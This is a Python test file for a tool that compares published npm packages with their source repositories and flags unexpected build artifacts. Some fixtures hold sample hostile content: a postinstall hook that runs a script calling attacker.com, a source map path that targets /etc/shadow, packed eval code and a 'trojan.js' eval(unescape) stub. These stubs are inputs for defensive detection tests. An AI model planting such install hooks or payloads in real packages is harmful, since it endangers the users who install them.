import gzip
import io
import json
import tarfile
from collections.abc import Mapping
from pathlib import Path

from app.adapters.base import PackageMetadata, SourceRepository
from app.analysis.models import AnalysisScope, SecurityAnalysis
from app.archives.extract import extract_archive
from app.archives.models import FileInventory
from app.comparison.compare import compare_inventories
from app.comparison.models import (
    ArtifactType,
    ComparisonReport,
    EvidenceKind,
    GeneratedAssessment,
    GeneratedClassification,
)
from app.provenance.models import ProvenanceResult, ProvenanceStatus
from app.schemas.scans import Ecosystem
from app.scoring.risk import score_release
from app.source.models import (
    Confidence,
    GitHubRepository,
    MatchMethod,
    MatchStatus,
    SourceMatch,
)

COMMIT = "a" * 40
LIKELY = GeneratedClassification.LIKELY_GENERATED
SUSPICIOUS = GeneratedClassification.SUSPICIOUS
UNCERTAIN = GeneratedClassification.UNCERTAIN

Files = Mapping[str, bytes | str]


def matched() -> SourceMatch:
    return SourceMatch(
        status=MatchStatus.MATCHED,
        method=MatchMethod.RECORDED_COMMIT_AND_TAG,
        confidence=Confidence.HIGH,
        explanation="test",
        repository=GitHubRepository(owner="acme", name="demo"),
        commit_sha=COMMIT,
        tag="v1.0.0",
    )


def make_metadata(scripts: dict[str, str] | None = None) -> PackageMetadata:
    return PackageMetadata(
        ecosystem=Ecosystem.NPM,
        name="demo",
        version="1.0.0",
        description=None,
        license=None,
        homepage=None,
        repository=SourceRepository(declared="x", url="https://github.com/acme/demo"),
        source_commit=COMMIT,
        published_at=None,
        dependencies=(),
        scripts=scripts or {},
        has_install_script=bool(
            scripts and any(k in scripts for k in ("preinstall", "install", "postinstall"))
        ),
        entry_points={},
        artifacts=(),
        manifest={},
    )


def make_inventory(
    tmp_path: Path,
    label: str,
    files: Files,
    modes: Mapping[str, int] | None = None,
) -> FileInventory:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tar:
        for name, content in files.items():
            data = content.encode() if isinstance(content, str) else content
            info = tarfile.TarInfo(f"root/{name}")
            info.size = len(data)
            info.mode = (modes or {}).get(name, 0o644)
            tar.addfile(info, io.BytesIO(data))
    tarball = tmp_path / f"{label}.tgz"
    tarball.write_bytes(gzip.compress(buffer.getvalue()))
    destination = tmp_path / label
    return extract_archive(tarball, destination)


def compare(
    tmp_path: Path,
    package_files: Files,
    source_files: Files,
    scripts: dict[str, str] | None = None,
    modes: Mapping[str, int] | None = None,
) -> ComparisonReport:
    pkg_inv = make_inventory(tmp_path, "pkg", package_files, modes=modes)
    src_inv = make_inventory(tmp_path, "src", source_files)
    return compare_inventories(
        make_metadata(scripts=scripts),
        matched(),
        pkg_inv,
        src_inv,
    )


def assessment(report: ComparisonReport, path: str) -> GeneratedAssessment:
    for f in report.files:
        if f.path == path:
            assert f.generated is not None
            return f.generated
    raise KeyError(path)


# -------------------------------------------------------------------------
# 1. Legitimate Build Output Tests
# -------------------------------------------------------------------------


def test_typescript_compiled_to_javascript(tmp_path: Path) -> None:
    """Verifies that TypeScript compiled with tsc into declared outDir is LIKELY_GENERATED."""
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/index.ts": "export const greeting: string = 'hello';",
    }
    package = {
        "package.json": json.dumps({"name": "demo", "main": "dist/index.js"}),
        "dist/index.js": '"use strict";\nexports.greeting = "hello";\n',
    }
    report = compare(tmp_path, package, source)
    gen = assessment(report, "dist/index.js")

    assert gen.classification is LIKELY
    assert gen.artifact_type is ArtifactType.COMPILED
    assert gen.confidence >= 0.88
    assert "src/index.ts" in gen.explanation
    assert any(ev.kind is EvidenceKind.SOURCE_COUNTERPART for ev in gen.evidence)
    assert any(ev.kind is EvidenceKind.OUTPUT_DIRECTORY for ev in gen.evidence)


def test_typescript_declaration_files(tmp_path: Path) -> None:
    """Verifies that declaration (.d.ts) and declaration map (.d.ts.map) files are identified."""
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/index.ts": "export const a = 1;",
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "dist/index.js": "exports.a = 1;\n",
        "dist/index.d.ts": "export declare const a = 1;\n",
    }
    report = compare(tmp_path, package, source)
    dts_gen = assessment(report, "dist/index.d.ts")

    assert dts_gen.classification is LIKELY
    assert dts_gen.artifact_type is ArtifactType.DECLARATION


def test_bundler_bundle_from_entry_point(tmp_path: Path) -> None:
    """Verifies that bundler output specified as package entry point is LIKELY_GENERATED."""
    rollup_cfg = (
        "export default { input: 'src/main.js', "
        "output: { file: 'dist/bundle.js', format: 'cjs' } };"
    )
    source = {
        "package.json": json.dumps(
            {
                "name": "demo",
                "main": "dist/bundle.js",
                "scripts": {"build": "rollup -c"},
            }
        ),
        "rollup.config.js": rollup_cfg,
        "src/main.js": "console.log('hi');",
    }
    package = {
        "package.json": json.dumps({"name": "demo", "main": "dist/bundle.js"}),
        "dist/bundle.js": "'use strict';\nconsole.log('hi');\n",
    }
    report = compare(tmp_path, package, source)
    gen = assessment(report, "dist/bundle.js")

    assert gen.classification is LIKELY
    assert gen.artifact_type is ArtifactType.BUNDLED
    assert gen.confidence >= 0.88
    assert "dist/bundle.js" in gen.explanation


def test_minified_javascript_output(tmp_path: Path) -> None:
    """Verifies that minified output is detected with MINIFIED artifact type."""
    minified_code = "var a=1,b=2;function c(d){return a+b+d}c(3);" + ("x=1;" * 60)
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/app.ts": "const a = 1;\nexport function c(d: number) { return d; }",
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "dist/app.js": minified_code,
    }
    report = compare(tmp_path, package, source)
    gen = assessment(report, "dist/app.js")

    assert gen.classification is LIKELY
    assert gen.artifact_type is ArtifactType.MINIFIED


def test_content_similarity_calculated(tmp_path: Path) -> None:
    """Verifies that content similarity between package and source is calculated and recorded."""
    src_code = "export function add(a: number, b: number): number {\n  return a + b;\n}\n"
    pkg_code = (
        "// Banner: built by demo\nfunction add(a, b) {\n  return a + b;\n}\nexports.add = add;\n"
    )
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/math.ts": src_code,
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "dist/math.js": pkg_code,
    }
    report = compare(tmp_path, package, source)
    gen = assessment(report, "dist/math.js")

    assert gen.classification is LIKELY
    assert gen.content_similarity is not None
    assert gen.content_similarity > 0.40


# -------------------------------------------------------------------------
# 2. Unexpected & Uncertain Files Tests (Not Malicious)
# -------------------------------------------------------------------------


def test_dist_directory_alone_never_whitelisted(tmp_path: Path) -> None:
    """Verifies that an extra file in dist/ without build tools stays UNCERTAIN."""
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"test": "jest"}}),
        "src/index.js": "console.log('hi');",
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "dist/index.js": "console.log('injected');",
    }
    report = compare(tmp_path, package, source)
    gen = assessment(report, "dist/index.js")

    assert gen.classification is UNCERTAIN
    assert "no build output" in gen.explanation.lower()
    assert gen.confidence <= 0.65


def test_unlinked_extra_file_in_real_build_dir_stays_uncertain(tmp_path: Path) -> None:
    """Verifies that an unlinked extra file in a build dir stays UNCERTAIN, not suspicious."""
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/index.ts": "export const ok = 1;",
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "dist/index.js": "exports.ok = 1;\n",
        "dist/extra_util.js": "exports.extra = 2;\n",
    }
    report = compare(tmp_path, package, source)

    assert assessment(report, "dist/index.js").classification is LIKELY
    extra_gen = assessment(report, "dist/extra_util.js")
    assert extra_gen.classification is UNCERTAIN
    assert "no source counterpart" in extra_gen.explanation.lower()


def test_unrecognized_custom_build_command_stays_uncertain(tmp_path: Path) -> None:
    """Custom unrecognized shell script cannot verify generated output -> stays UNCERTAIN."""
    source = {
        "package.json": json.dumps(
            {"name": "demo", "scripts": {"build": "bash custom_compile.sh"}}
        ),
        "src/app.js": "console.log('source');",
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "out/app.js": "console.log('custom output');",
    }
    report = compare(tmp_path, package, source)
    gen = assessment(report, "out/app.js")

    assert gen.classification is UNCERTAIN
    assert "custom_compile.sh" in report.build.unrecognized_build_commands[0]


def test_non_code_documentation_asset_stays_uncertain(tmp_path: Path) -> None:
    """Added documentation or static files stay UNCERTAIN without being flagged suspicious."""
    source = {
        "package.json": json.dumps({"name": "demo"}),
        "index.js": "console.log(1);",
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "index.js": "console.log(1);",
        "docs/EXTRA_GUIDE.md": "# Extra Guide\nAdditional notes.",
    }
    report = compare(tmp_path, package, source)
    gen = assessment(report, "docs/EXTRA_GUIDE.md")

    assert gen.classification is UNCERTAIN


# -------------------------------------------------------------------------
# 3. Suspicious Artifact Tests (Supported by Affirmative Evidence)
# -------------------------------------------------------------------------


def test_untracked_install_script_execution_is_suspicious(tmp_path: Path) -> None:
    """An added file executed at install time with no source counterpart is SUSPICIOUS."""
    source = {
        "package.json": json.dumps({"name": "demo"}),
        "src/index.js": "console.log('app');",
    }
    package = {
        "package.json": json.dumps(
            {
                "name": "demo",
                "scripts": {"postinstall": "node dist/stealth_telemetry.js"},
            }
        ),
        "src/index.js": "console.log('app');",
        "dist/stealth_telemetry.js": "const http = require('http'); http.get('http://attacker.com');",
    }
    report = compare(
        tmp_path,
        package,
        source,
        scripts={"postinstall": "node dist/stealth_telemetry.js"},
    )
    gen = assessment(report, "dist/stealth_telemetry.js")

    assert gen.classification is SUSPICIOUS
    assert gen.confidence >= 0.85
    assert "install time" in gen.explanation.lower()
    assert any(ev.kind is EvidenceKind.SUSPICIOUS_INDICATOR for ev in gen.evidence)


def test_path_traversal_source_map_is_suspicious(tmp_path: Path) -> None:
    """Source map containing directory traversal target (../../..) is SUSPICIOUS."""
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/index.ts": "export const x = 1;",
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "dist/index.js": "exports.x = 1;\n//# sourceMappingURL=../../../../etc/shadow\n",
    }
    report = compare(tmp_path, package, source)
    gen = assessment(report, "dist/index.js")

    assert gen.classification is SUSPICIOUS
    assert "source mapping url" in gen.explanation.lower()


def test_obfuscated_packer_in_unlinked_artifact_is_suspicious(tmp_path: Path) -> None:
    """An unlinked file containing Dean Edwards packer or eval(atob) is SUSPICIOUS."""
    packer_payload = (
        "eval(function(p,a,c,k,e,r){e=String;return p}"
        "('malicious payload',1,1,'payload'.split('|'),0,{}))"
    )
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/index.ts": "export const ok = 1;",
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "dist/index.js": "exports.ok = 1;\n",
        "dist/vendor_unlinked.js": packer_payload,
    }
    report = compare(tmp_path, package, source)
    gen = assessment(report, "dist/vendor_unlinked.js")

    assert gen.classification is SUSPICIOUS
    assert "obfuscated code" in gen.explanation.lower()


def test_unexpected_executable_bit_on_library_script_is_suspicious(tmp_path: Path) -> None:
    """An added library JS file with executable permission (+x) is SUSPICIOUS."""
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/index.ts": "export const a = 1;",
    }
    package = {
        "package.json": json.dumps({"name": "demo"}),
        "dist/index.js": "exports.a = 1;\n",
        "dist/lib_unexpected.js": "console.log('exec');\n",
    }
    # 0o755 gives executable bit
    report = compare(tmp_path, package, source, modes={"dist/lib_unexpected.js": 0o755})
    gen = assessment(report, "dist/lib_unexpected.js")

    assert gen.classification is SUSPICIOUS
    assert "executable bit" in gen.explanation.lower()


# -------------------------------------------------------------------------
# 4. Pipeline Integration & Risk Scoring
# -------------------------------------------------------------------------


def test_pipeline_summary_tracks_suspicious_and_likely_generated(tmp_path: Path) -> None:
    """Verifies that ComparisonSummary reflects likely_generated, suspicious, and uncertain."""
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/index.ts": "export const a = 1;",
    }
    package = {
        "package.json": json.dumps(
            {
                "name": "demo",
                "scripts": {"postinstall": "node dist/trojan.js"},
            }
        ),
        "dist/index.js": "exports.a = 1;\n",  # LIKELY_GENERATED
        "dist/extra.js": "exports.x = 2;\n",  # UNCERTAIN
        "dist/trojan.js": "eval(unescape('%72%65%71'));",  # SUSPICIOUS
    }
    report = compare(
        tmp_path,
        package,
        source,
        scripts={"postinstall": "node dist/trojan.js"},
    )

    assert report.summary.likely_generated == 1
    assert report.summary.suspicious == 1
    assert report.summary.uncertain >= 1


def test_risk_scoring_incorporates_suspicious_artifact_factor(tmp_path: Path) -> None:
    """Verifies that score_release assigns high risk factors to SUSPICIOUS build artifacts."""
    source = {
        "package.json": json.dumps({"name": "demo", "scripts": {"build": "tsc"}}),
        "tsconfig.json": json.dumps({"compilerOptions": {"outDir": "dist", "rootDir": "src"}}),
        "src/index.ts": "export const a = 1;",
    }
    package = {
        "package.json": json.dumps(
            {
                "name": "demo",
                "scripts": {"postinstall": "node dist/untracked.js"},
            }
        ),
        "dist/index.js": "exports.a = 1;\n",
        "dist/untracked.js": "console.log('stealth');",
    }
    pkg_inv = make_inventory(tmp_path, "pkg_risk", package)
    src_inv = make_inventory(tmp_path, "src_risk", source)
    report = compare_inventories(
        make_metadata(scripts={"postinstall": "node dist/untracked.js"}),
        matched(),
        pkg_inv,
        src_inv,
    )

    analysis = SecurityAnalysis(
        scope=AnalysisScope.DIFFERENCES_FROM_SOURCE, files_scanned=0, findings=(), gaps=()
    )
    provenance = ProvenanceResult(status=ProvenanceStatus.UNAVAILABLE, explanation="none")
    risk = score_release(matched(), report, pkg_inv, analysis, provenance)
    factor_ids = {f.id for f in risk.factors}

    assert "SUSPICIOUS_BUILD_ARTIFACT" in factor_ids
